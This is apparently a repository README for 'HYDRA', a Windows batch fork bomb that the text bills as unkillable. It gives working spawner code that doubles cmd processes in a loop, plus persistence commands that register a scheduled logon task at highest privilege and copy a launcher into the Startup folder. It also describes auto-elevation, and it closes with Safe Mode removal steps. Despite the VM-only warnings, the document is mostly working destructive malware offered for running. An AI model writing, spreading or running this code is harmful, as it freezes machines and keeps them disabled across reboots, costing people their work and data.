# HYDRA - Unkillable Exponential CMD Spawner

"Cut off one head, two more shall take its place."

## DANGER - READ BEFORE RUNNING

THIS SOFTWARE IS DESTRUCTIVE AND INTENTIONALLY UNKILLABLE

| Property | Value |
|----------|-------|
| Safety Rating | 💀💀💀💀💀 |
| System Impact | Complete freeze within 2-5 seconds |
| Recovery Difficulty | Extreme (requires Safe Mode) |
| Persistence | Survives reboot and logoff |

DO NOT RUN ON:
- Your main PC
- Any computer with important data
- A work or school computer
- A production system
- A laptop you care about

ONLY RUN ON:
- A virtual machine (VMware, VirtualBox, Hyper-V)
- A disposable test PC
- A computer you're about to wipe

---

## What It Does

HYDRA is a batch-based fork bomb combined with persistence mechanisms that make it nearly impossible to stop.

When executed, it:

1. Creates an exponential spawner - Each CMD window launches 2 more, leading to 1 -> 2 -> 4 -> 8 -> 16 -> 32 -> 64 -> 128 -> 256+ windows within seconds
2. Installs a scheduled task - Runs at every user logon (schtasks)
3. Adds to Startup folder - Redundant persistence mechanism
4. Auto-elevates - Requests Administrator privileges automatically
5. Runs immediately - No waiting, chaos starts instantly

### Why "Unkillable"?

| Action | Result |
|--------|--------|
| Killing CMD windows | They respawn faster than you can close them |
| Task Manager | Freezes before you can use it |
| Rebooting | The scheduled task relaunches everything |
| Killing the spawner process | The launcher or Startup folder still triggers |
| End Task on cmd.exe | Exponential growth continues from remaining processes |

The only recovery method: Boot into Safe Mode and manually delete C:\Hydra, the scheduled task, and the Startup folder entry.

---

## Installation

```batch
git clone https://github.com/yourusername/hydra.git
cd hydra
right-click hydra.bat -> Run as Administrator Or simply double-click
```

## Repository Structure

```
hydra/
├── hydra.bat          # Main executable
└── README.md          # This file
```


## Technical Details

Spawner Logic:
```
@echo off
:loop
start "" "%~f0"
start "" "%~f0"
goto loop
```

This is a classic fork bomb - each iteration doubles the number of running processes.

## Persistence Mechanisms

```
:: Scheduled Task (runs at every logon)
schtasks /create /tn "Hydra" /tr "launcher.bat" /sc onlogon /ru "%USERNAME%" /rl highest

:: Startup Folder (redundant)
copy "launcher.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
```


## Removal Instructions (Recovery)

If you've run this and need to stop it:

Step 1: Boot into Safe Mode
- Restart PC
- Press F8 (or Shift + Restart) -> Safe Mode with Command Prompt


Step 2: Delete the scheduled task
```
C:\Windows\System32\schtasks.exe /delete /tn "Hydra" /f
```

Step 3: Delete the Startup folder file
```
del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\launcher.bat" /f /q
```

Step 4: Delete the Hydra folder
```
rmdir /s /q C:\Hydra
```


Step 5: Reboot normally


*Remember: With great power comes great responsibility... and possibly a bricked computer.*
